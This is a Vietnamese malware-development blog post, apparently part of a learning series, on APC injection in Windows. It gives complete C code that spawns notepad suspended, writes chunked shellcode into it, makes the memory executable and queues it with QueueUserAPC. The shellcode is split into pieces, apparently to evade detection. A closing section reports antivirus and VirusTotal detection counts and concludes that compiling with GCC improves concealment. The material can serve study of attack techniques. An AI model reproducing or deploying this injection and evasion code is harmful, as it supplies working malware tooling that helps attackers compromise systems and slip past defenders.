## APC Injection

### Logic hoạt động
Sử dụng `QueueUserAPC` API để xếp hàng vào 1 APC, tham số và cách sử dụng của hàm này xem tại trang của microsoft: [QueueUserAPC](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc).

Sau khi gọi API trên, APC function được thực thi đã được cài đặt thông qua QueueUserAPC, process cần phải được đặt trong trạng thái cảnh báo (alertable state). Điều này có thể đạt được bằng cách tạo 1 thread sau đó sử dụng các API sau:

- `Sleep`
- `SleepEx`
- `MsgWaitForMultipleObjects`
- `MsgWaitForMultipleObjectsEx`
- `WaitForSingleObject`
- `WaitForSingleObjectEx`
- `WaitForMultipleObjects`
- `WaitForMultipleObjectsEx`
- `SignalObjectAndWait`

Ngoài ra, còn 2 cách nữa đó là:

- Tạo tiến trình với trạng thái `CREATE_SUSPENDED` và sau đó sử dụng `ResumeThread`
- Tạo tiến trình với trạng thái `DEBUG_PROCESS` và sau đó sử dụng `DebugActiveProcessStop` để tiếp tục tiến trình.

### Code
Phần code khá đơn giản so với các kiểu inject khác, dưới đây là code inject vào remote process để thực thi tải trọng mở notepad.
Mã tải trọng được tạo ra đã được nhắc đến trong 1 bài viết khác của tôi: [Payload Placement](https://github.com/vuongle-vigo/MalDevAcademy-Blog/tree/main/25-12-2023%20Payload%20Placement)


```c
# include <Windows.h>
# include <stdio.h>

BOOL RunViaApcInjection(IN HANDLE hThread, IN HANDLE hProcess, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {
	PVOID pAddress = NULL;
	DWORD dwOldProtection = NULL;

	pAddress = VirtualAllocEx(hProcess, NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pAddress == NULL) {
		printf("\t[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	if (!WriteProcessMemory(hProcess, pAddress, pPayload, sPayloadSize, NULL)) {
		printf("\t[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	if (!VirtualProtectEx(hProcess, pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("\t[!] VirtualProtect Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	if (!QueueUserAPC((PAPCFUNC)pAddress, hThread, NULL)) {
		printf("\t[!] QueueUserAPC Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

BOOL CreateSuspendedProcess(IN LPCSTR lpProcessPath, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {
	STARTUPINFOA si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	si.cb = sizeof(STARTUPINFOA);

	if (!CreateProcessA(NULL, lpProcessPath, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
		printf("[!] CreateProcessA Failed with Error : %d \n", GetLastError());
		return FALSE;
	}

	*dwProcessId = pi.dwProcessId;
	*hProcess = pi.hProcess;
	*hThread = pi.hThread;

	if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL) {
		return TRUE;
	}

	return FALSE;
}

unsigned char sc_0[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51";
const unsigned char sc_1[] = "\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52";
unsigned char sc_2[] = "\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0";
const unsigned char sc_3[] = "\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed";
unsigned char sc_4[] = "\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88";
const unsigned char sc_5[] = "\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44";
unsigned char sc_6[] = "\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48";
const unsigned char sc_7[] = "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1";
unsigned char sc_8[] = "\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44";
const unsigned char sc_9[] = "\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49";
unsigned char sc_10[] = "\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a";
const unsigned char sc_11[] = "\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41";
unsigned char sc_12[] = "\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00";
const unsigned char sc_13[] = "\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b";
unsigned char sc_14[] = "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff";
const unsigned char sc_15[] = "\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47";
unsigned char sc_16[] = "\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x6e\x6f\x74\x65\x70";
const unsigned char sc_17[] = "\x61\x64\x2e\x65\x78\x65\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";

unsigned char sc[18 * 16];
void build_sc() {
	memcpy(&sc[0], sc_0, 16);
	memcpy(&sc[16 * 1], sc_1, 16);
	memcpy(&sc[16 * 2], sc_2, 16);
	memcpy(&sc[16 * 3], sc_3, 16);
	memcpy(&sc[16 * 4], sc_4, 16);
	memcpy(&sc[16 * 5], sc_5, 16);
	memcpy(&sc[16 * 6], sc_6, 16);
	memcpy(&sc[16 * 7], sc_7, 16);
	memcpy(&sc[16 * 8], sc_8, 16);
	memcpy(&sc[16 * 9], sc_9, 16);
	memcpy(&sc[16 * 10], sc_10, 16);
	memcpy(&sc[16 * 11], sc_11, 16);
	memcpy(&sc[16 * 12], sc_12, 16);
	memcpy(&sc[16 * 13], sc_13, 16);
	memcpy(&sc[16 * 14], sc_14, 16);
	memcpy(&sc[16 * 15], sc_15, 16);
	memcpy(&sc[16 * 16], sc_16, 16);
	memcpy(&sc[16 * 17], sc_17, 16);
}

int main() {
	build_sc();

	DWORD dwProcessId;
	HANDLE hProcess, hThread;
	
	if (!CreateSuspendedProcess("C:\\Windows\\System32\\notepad.exe", &dwProcessId, &hProcess, &hThread)) {
		printf("[!] CreateSuspendedProcess Failed\n");
		return -1;
	}
	
	if (!RunViaApcInjection(hThread, hProcess, sc, sizeof(sc))) {
		printf("[!] RunViaApcInjection Failed\n");
		return -1;
	}

	ResumeThread(hThread);
	//DebugActiveProcessStop(dwProcessId);
	printf(
		"Done"
	);
}
```



### Check AV Windows 10 Defender
- VS2022: Build no debug info + MT release, bị phát hiện mã độc ngay khi build xong, và chuyển qua máy ảo mà chưa cần chạy (Virus total: 22/72)
- GCC: Với phiên bản shellcode lỗi, quá trình chạy không gây ra vấn đề gì (vấn đề nằm ở shellcode)
- GCC: Với phiên bản shellcode chuẩn, scan không bị phát hiện, chạy cũng không bị phát hiện trên máy ảo, tuy nhiên vẫn có khả năng bị phát hiện do shellcode được giải mã và có signature. (Virus total: 21/73)
 
=> Việc build bằng GCC có thể giúp tăng khả năng che dấu của mã.
